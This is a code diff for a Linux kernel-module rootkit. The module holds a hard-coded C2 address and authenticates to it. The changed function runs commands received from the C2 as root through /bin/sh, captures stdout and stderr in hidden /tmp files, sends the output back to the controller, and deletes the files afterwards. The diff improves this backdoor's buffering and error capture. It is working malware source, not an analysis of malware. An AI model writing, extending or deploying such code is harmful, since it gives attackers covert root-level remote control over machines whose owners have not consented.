@@ -11,6 +11,7 @@
 #define AUTH_PREFIX "AUTH "
 #define AUTH_PREFIX_LEN (sizeof(AUTH_PREFIX) - 1)
 #define TMP_OUT_FILE "/tmp/.wlkom_out"
+#define TMP_ERR_FILE "/tmp/.wlkom_err"
 
 static char *password_hash = "";
 static char *c2_ip    = "192.168.100.10";
@@ -74,16 +75,27 @@ static int send_reply(const char *reply)
 
 static void execute_and_send_output(char *cmd)
 {
-    char cmd_redirect[512];
-    char file_buf[512];
+    char *cmd_redirect;
+    char *file_buf;
     char status_header[128];
     struct file *file;
     loff_t pos = 0;
     ssize_t bytes_read;
     int exit_status;
 
-    
-    snprintf(cmd_redirect, sizeof(cmd_redirect), "%s > " TMP_OUT_FILE " 2>&1", cmd);
+    cmd_redirect = kmalloc(4096, GFP_KERNEL);
+    if (!cmd_redirect) {
+        send_reply("[Rootkit Error]: kmalloc cmd_redirect failed.\n\n");
+        return;
+    }
+    file_buf = kmalloc(4096, GFP_KERNEL);
+    if (!file_buf) {
+        send_reply("[Rootkit Error]: kmalloc file_buf failed.\n\n");
+        kfree(cmd_redirect);
+        return;
+    }
+
+    snprintf(cmd_redirect, 4096, "(%s) > " TMP_OUT_FILE " 2>" TMP_ERR_FILE, cmd);
 
     char *argv[] = { "/bin/sh", "-c", cmd_redirect, NULL };
     static char *envp[] = {
@@ -95,35 +107,43 @@ static void execute_and_send_output(char *cmd)
 
     
     exit_status = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
-
-    
-    exit_status = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
     int real_exit_code = (exit_status >> 8) & 0xFF;
     
     
-    snprintf(status_header, sizeof(status_header), "[Exit Status: %d]\n--- Command Output ---\n", real_exit_code);
+    snprintf(status_header, sizeof(status_header), "[Exit Status: %d]\n", real_exit_code);
     send_reply(status_header);
 
-    
+    send_reply("--- STDOUT ---\n");
     file = filp_open(TMP_OUT_FILE, O_RDONLY, 0);
-    if (IS_ERR(file)) {
-        send_reply("[Rootkit Error]: Could not read command output stream.\n\n");
-        goto cleanup;
+    if (!IS_ERR(file)) {
+        while ((bytes_read = kernel_read(file, file_buf, 4095, &pos)) > 0) {
+            file_buf[bytes_read] = '\0';
+            send_reply(file_buf);
+        }
+        filp_close(file, NULL);
     }
 
-    
-    while ((bytes_read = kernel_read(file, file_buf, sizeof(file_buf) - 1, &pos)) > 0) {
-        file_buf[bytes_read] = '\0';
-        send_reply(file_buf);
+    pos = 0;
+    send_reply("--- STDERR ---\n");
+    file = filp_open(TMP_ERR_FILE, O_RDONLY, 0);
+    if (!IS_ERR(file)) {
+        while ((bytes_read = kernel_read(file, file_buf, 4095, &pos)) > 0) {
+            file_buf[bytes_read] = '\0';
+            send_reply(file_buf);
+        }
+        filp_close(file, NULL);
     }
-    
-    filp_close(file, NULL);
-    send_reply("\n--- End of Output ---\n\n");
 
-cleanup:
-    
-    char *rm_argv[] = { "/bin/rm", "-f", TMP_OUT_FILE, NULL };
-    call_usermodehelper(rm_argv[0], rm_argv, envp, UMH_WAIT_PROC);
+    send_reply("--- End of Output ---\n\n");
+
+    {
+        char *rm_out[] = { "/bin/rm", "-f", TMP_OUT_FILE, NULL };
+        char *rm_err[] = { "/bin/rm", "-f", TMP_ERR_FILE, NULL };
+        call_usermodehelper(rm_out[0], rm_out, envp, UMH_WAIT_PROC);
+        call_usermodehelper(rm_err[0], rm_err, envp, UMH_WAIT_PROC);
+    }
+    kfree(file_buf);
+    kfree(cmd_redirect);
 }
 
 static int authenticate_c2(void)
